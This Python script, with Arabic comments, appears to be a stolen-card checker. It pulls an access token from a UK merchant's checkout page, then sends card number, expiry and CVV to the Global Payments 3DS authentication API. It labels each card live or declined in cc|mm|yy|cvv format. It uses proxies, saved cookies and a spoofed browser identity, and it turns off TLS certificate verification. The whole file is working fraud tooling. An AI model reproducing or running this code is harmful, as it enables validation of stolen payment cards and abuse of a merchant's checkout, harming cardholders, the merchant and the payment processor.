"""
بوابة الدفع: Global 3DS LookUp GP-2
الموقع: mx5oc.co.uk
نوع البوابة: Global 3DS LookUp
تدفق الطلبات:
1. GET /checkout/ -> استخراج accessToken من صفحة الدفع
2. POST https://apis.globalpay.com/ucp/authentications -> إجراء 3DS lookup وتصنيف النتيجة
"""
import aiohttp
import asyncio
import uuid
import ssl
import re
from cookies_loader import load_cookies, get_cookies_path


async def req1_get_access_token(
    session: aiohttp.ClientSession,
    proxy_url: str = None,
) -> str:
    """الخطوة 1: جلب accessToken من صفحة الدفع."""
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    }
    try:
        async with session.get(
            "https://mx5oc.co.uk/checkout/",
            headers=headers,
            proxy=proxy_url,
        ) as r:
            text = await r.text()

        token_match = re.search(r'accessToken["\']?\s*:\s*["\']([^"\']+)["\']', text)
        return token_match.group(1) if token_match else ""
    except Exception as e:
        raise RuntimeError(f"req1_get_access_token failed: {e}") from e


async def req2_3ds_lookup(
    session: aiohttp.ClientSession,
    access_token: str,
    cc: str,
    mes: str,
    ano: str,
    cvv: str,
    proxy_url: str = None,
) -> dict:
    """الخطوة 2: إجراء 3DS LookUp عبر Global Payments API."""
    headers = {
        "Authorization": f"Bearer {access_token}",
        "Content-Type": "application/json",
        "X-GP-Version": "2021-03-22",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    }
    data = {
        "account_id": "internet",
        "channel": "CNP",
        "type": "3DS2",
        "amount": "590",
        "currency": "GBP",
        "reference": str(uuid.uuid4()),
        "country": "GB",
        "payment_method": {
            "name": "CARD_HOLDER_NAME",
            "number": cc,
            "expiry_month": mes,
            "expiry_year": ano,
            "cvv": cvv,
            "entry_mode": "MANUAL",
        },
        "notifications": {
            "challenge_return_url": "https://mx5oc.co.uk/checkout/",
            "method_return_url": "https://mx5oc.co.uk/checkout/",
        },
    }
    try:
        async with session.post(
            "https://apis.globalpay.com/ucp/authentications",
            headers=headers,
            json=data,
            proxy=proxy_url,
        ) as r:
            return await r.json(content_type=None)
    except Exception as e:
        raise RuntimeError(f"req2_3ds_lookup failed: {e}") from e


async def process_GP_2(
    cc: str,
    mes: str,
    ano: str,
    cvv: str,
    proxy_url: str = None,
) -> tuple[str, str]:
    """الدالة الرئيسية لفحص البطاقة عبر بوابة Global 3DS LookUp GP-2."""
    ssl_ctx = ssl.create_default_context()
    ssl_ctx.check_hostname = False
    ssl_ctx.verify_mode = ssl.CERT_NONE
    connector = aiohttp.TCPConnector(ssl=ssl_ctx)
    timeout = aiohttp.ClientTimeout(total=20)

    try:
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            try:
                cookies = load_cookies(get_cookies_path("mx5oc.co.uk.json"))
                session.cookie_jar.update_cookies(cookies)
            except Exception:
                pass

            access_token = await req1_get_access_token(session, proxy_url)
            response_json = await req2_3ds_lookup(session, access_token, cc, mes, ano, cvv, proxy_url)

    except Exception as e:
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", f"Error: {e}"

    status = response_json.get("status", "")
    response_msg = ""
    status_icon = "❌"

    if status == "CHALLENGE_REQUIRED":
        status_icon = "✅"
        response_msg = "3DS Challenge Required"
    elif status == "AUTHENTICATED":
        status_icon = "✅"
        response_msg = "Authenticated / Low Risk"
    elif "error" in response_json:
        error_msg = response_json.get("error", {}).get("message", "Unknown Error")
        response_msg = f"Declined: {error_msg}"
    else:
        response_msg = f"Declined: {status}"

    return f"{status_icon} | {cc}|{mes}|{ano}|{cvv}", response_msg
